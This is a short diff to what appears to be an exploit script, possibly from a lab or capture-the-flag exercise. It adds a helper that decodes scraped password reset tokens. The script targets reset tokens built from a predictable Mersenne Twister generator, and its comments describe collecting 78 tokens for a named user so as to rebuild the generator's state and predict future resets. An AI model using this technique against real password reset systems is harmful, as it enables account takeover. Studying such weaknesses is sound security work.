@@ -146,6 +146,18 @@ def breakMT():
        print("sad")
 
 
+def unmix(token):
+    # request 78 consecutive password reset tokens from eortiz
+    # recreate initial state of generator and predict all future password resets
+    token = base64.b64decode(token).decode('utf-8')
+    print(token)
+    t = token.split(":")
+    t.remove("")
+    print(t)
+    for i in range(len(t)):
+        t[i] = int(t[i])
+    return t
+
 
 def main():
     # mt = MerTwist(0)
@@ -164,7 +176,7 @@ def main():
         b64tokens.append(x.text.split("reset?token=")[1].split("<!--close_token-->")[0])
 
     print(b64tokens)
-    
+
 main()
 
 
